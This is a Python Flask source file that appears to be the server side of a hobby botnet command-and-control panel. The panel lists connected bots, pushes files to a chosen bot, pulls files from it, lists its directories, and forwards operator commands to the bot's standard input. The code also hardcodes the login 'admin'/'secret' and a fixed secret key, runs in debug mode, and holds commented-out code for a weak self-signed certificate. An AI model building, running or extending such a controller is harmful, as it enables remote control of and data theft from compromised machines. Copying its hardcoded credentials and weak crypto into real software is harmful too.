import os
import socket
from flask import Flask, render_template, session, request, Response, stream_with_context
from flask import make_response
from flask_socketio import SocketIO, emit
from functools import wraps

# Loading library depends on how we want to setup the project later,
# for now this will do
try:
    from server.botnetclasses import *
except:
    from botnetclasses import *

''' See accompanying README for TODOs.

 To run: python server.py'''

HOST = 'localhost'
PORT = 1708
UPLOAD_FOLDER = 'static/uploads/'  # TODO
CLIENT_FILE = '../client/client.py' # TODO

# Set this variable to "threading", "eventlet" or "gevent" to test the
# different async modes, or leave it set to None for the application to choose
# the best option based on installed packages.
async_mode = None

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, async_mode=async_mode)
thread = None


def check_auth(username, password):
    """This function is called to check if a username /
    password combination is valid.
    """
    return username == 'admin' and password == 'secret'  # TODO: set username and password


def authenticate():
    """Sends a 401 response that enables basic auth"""
    return Response(
        'Could not verify your access level for that URL.\n'
        'You have to login with proper credentials', 401,
        {'WWW-Authenticate': 'Basic realm="Login Required"'})


@app.route('/uploader', methods=['POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        # Starts forwarding file to client on separate thread, never saved locally (at least in non-temp file)
        if 'bot' in request.cookies:
            botnet.sendFile(request.cookies.get('bot'),f.filename,f)
        # TODO switch to in-progress instead of "success"
        return json.dumps({"success": True})

@app.route('/downloader', methods=['POST'])
def download_file():
    if request.method == 'POST':
        filename = request.form.get('file')
        if 'bot' in request.cookies:
            response = Response(stream_with_context(
                botnet.startFileDownload(
                    request.cookies.get('bot'),filename)))
            # Set the right header for the response
            # to be downloaded, instead of just printed on the browser
            # response.headers["Content-Disposition"] = "attachment; filename={}".format(filename)
            return response
        else:
            return "No bot selected", 404

@app.route('/ls', methods=['GET','POST'])
def list_dir():
    if request.method == 'POST':
        filename = request.form.get('file')
    else:
        filename = '.'
    if 'bot' in request.cookies:
        botnet.requestLs(request.cookies.get('bot'), filename)
        return "done"
    else:
        return "No bot selected", 404

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated


@app.route('/', methods=['GET', 'POST'])
@requires_auth
def index():
    connected = ''
    if 'bot' in request.cookies:
        connected = request.cookies.get('bot')
    resp = make_response(render_template('index.html',
                                         async_mode=socketio.async_mode,
                                         bot_list=botnet.getConnections(),
                                         connected=connected))
    if request.method == 'POST':
        resp.set_cookie('bot',request.form.get('bot'))
    return resp

@app.route('/finder')
@requires_auth
def finder():
    connected = ''
    if 'bot' in request.cookies:
        connected = request.cookies.get('bot')
    return render_template('finder.html', async_mode=socketio.async_mode, bot_list=botnet.getConnections(),
                                         connected=connected)


@socketio.on('send_command', namespace='/bot')
def send_command(cmd):
    if 'bot' in request.cookies:
        botnet.sendStdin(request.cookies.get('bot'), cmd['data'] + '\n')

if __name__ == "__main__":
    TCPSOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    TCPSOCK.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    TCPSOCK.bind((HOST, PORT))

    botnet = BotNet(socketio)
    botserver = BotServer(TCPSOCK, botnet, socketio, CLIENT_FILE)

    botnet.start()
    botserver.start()

    socketio.run(app, debug=True, use_reloader=False)

# TODO: implement HTTPS
#
#from OpenSSL import SSL, crypto
#
# # Crypto stuff
# def create_self_signed_cert(certfile, keyfile, certargs, cert_dir="."):
#     C_F = os.path.join(cert_dir, certfile)
#     K_F = os.path.join(cert_dir, keyfile)
#     if not os.path.exists(C_F) or not os.path.exists(K_F):
#         k = crypto.PKey()
#         k.generate_key(crypto.TYPE_RSA, 1024)
#         cert = crypto.X509()
#         cert.get_subject().C = certargs["Country"]
#         cert.get_subject().ST = certargs["State"]
#         cert.get_subject().L = certargs["City"]
#         cert.get_subject().O = certargs["Organization"]
#         cert.get_subject().OU = certargs["Org. Unit"]
#         cert.get_subject().CN = HOSTNAME
#         cert.set_serial_number(1000)
#         cert.gmtime_adj_notBefore(0)
#         cert.gmtime_adj_notAfter(315360000)
#         cert.set_issuer(cert.get_subject())
#         cert.set_pubkey(k)
#         cert.sign(k, 'sha1')
#         open(C_F, "wb").write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
#         open(K_F, "wb").write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))
# def start_cert():
#     CERT_FILE = "cert.pem"
#     KEY_FILE = "key.pem"
#     create_self_signed_cert(CERT_FILE, KEY_FILE,
#                             certargs=
#                             {"Country": "US",
#                              "State": "NY",
#                              "City": "Ithaca",
#                              "Organization": "CHC",
#                              "Org. Unit": "Side-Projects"})
#     context = (CERT_FILE, KEY_FILE)
#     app.run(host='0.0.0.0', debug=True, port=DEFAULT_PORT, ssl_context=context, threaded=True)